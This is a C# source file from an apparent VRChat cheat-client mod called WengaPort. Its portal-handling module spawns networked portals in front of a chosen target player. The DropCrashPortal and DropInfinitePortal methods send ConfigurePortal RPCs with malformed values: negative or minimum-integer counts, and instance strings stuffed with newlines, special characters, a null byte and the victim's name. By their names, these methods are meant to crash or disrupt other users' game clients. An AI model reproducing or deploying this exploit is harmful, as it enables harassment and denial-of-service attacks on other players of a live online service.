using System.Collections;
using System.Collections.Generic;
using Il2CppSystem;
using MelonLoader;
using UnityEngine;
using VRC;
using VRC.SDKBase;
using Object = UnityEngine.Object;

namespace WengaPort.Modules
{
    class PortalHandler
    {
        public static void DeletePortals()
        {
            PortalTrigger[] array = Resources.FindObjectsOfTypeAll<PortalTrigger>();
            for (int i = 0; i < array.Length; i++)
            {
                if (array[i].gameObject.activeInHierarchy && !(array[i].gameObject.GetComponentInParent<VRC_PortalMarker>() != null))
                {
                    Object.Destroy(array[i].gameObject);
                }
            }
        }
        public static void DropCrashPortal(VRCPlayer Target)
        {
            GameObject portal = Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "Portals/PortalInternalDynamic", Target.transform.position + Target.transform.forward * 1.505f, Target.transform.rotation);
            string world = "wrld_5b89c79e-c340-4510-be1b-476e9fcdedcc";
            string instance = "\n[₩Ɇ₦₲₳₱ØⱤ₮]\n" + Target.field_Private_Player_0.field_Private_APIUser_0.displayName + "\0";
            System.Random r = new System.Random();
            var values = new[] { -69, -666 };
            int result = values[r.Next(values.Length)];
            int count = result;

            Networking.RPC(RPC.Destination.AllBufferOne, portal, "ConfigurePortal", new Il2CppSystem.Object[]
            {
              (String)world,
              (String)instance,
                 new Int32
                 {
                    m_value = count
                 }.BoxIl2CppObject()
            });
        }
        public static void DropInfinitePortal(VRCPlayer Target)
        {
            GameObject portal = Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "Portals/PortalInternalDynamic", Target.transform.position + Target.transform.forward * 1.505f, Target.transform.rotation);
            string world = "wrld_5b89c79e-c340-4510-be1b-476e9fcdedcc";
            string instance = "\n[₩Ɇ₦₲₳₱ØⱤ₮]\n" + Target.field_Private_Player_0.field_Private_APIUser_0.displayName + "\0";
            MelonCoroutines.Start(DestroyDelayed(1f, portal.GetComponent<PortalInternal>()));
            int count = int.MinValue;

            Networking.RPC(RPC.Destination.AllBufferOne, portal, "ConfigurePortal", new Il2CppSystem.Object[]
            {
              (String)world,
              (String)instance,
                 new Int32
                 {
                    m_value = count
                 }.BoxIl2CppObject()
            });

        }

        public static void DropPortal(string RoomId)
        {
            string[] array = RoomId.Split(new char[]
            {
                ':'
            });
            DropPortal(array[0], array[1], 0, Utils.CurrentUser.transform.position + Utils.CurrentUser.transform.forward * 2f, Utils.CurrentUser.transform.rotation);
        }
        public static void DropPortal(string WorldID, string InstanceID, int players, Vector3 vector3, Quaternion quaternion)
        {
            GameObject gameObject = Networking.Instantiate(0, "Portals/PortalInternalDynamic", vector3, quaternion);
            RPC.Destination destination = (RPC.Destination)7;
            GameObject gameObject2 = gameObject;
            string text = "ConfigurePortal";
            Il2CppSystem.Object[] array = new Il2CppSystem.Object[3];
            array[0] = WorldID;
            array[1] = InstanceID;
            int num = 2;
            Int32 @int = default;
            @int.m_value = players;
            array[num] = @int.BoxIl2CppObject();
            Networking.RPC(destination, gameObject2, text, array);
        }

        public static IEnumerator DestroyDelayed(float seconds, Object obj)
        {
            yield return new WaitForSeconds(seconds);
            Object.Destroy(obj);
            yield break;
        }
        public static List<string> kosstrings = new List<string>();
        public static List<string> blockstrings = new List<string>();
        public static List<Player> Camstrings = new List<Player>();

        public static bool AntiPortal = false;
        public static bool FriendOnlyPortal = false;
    }
}
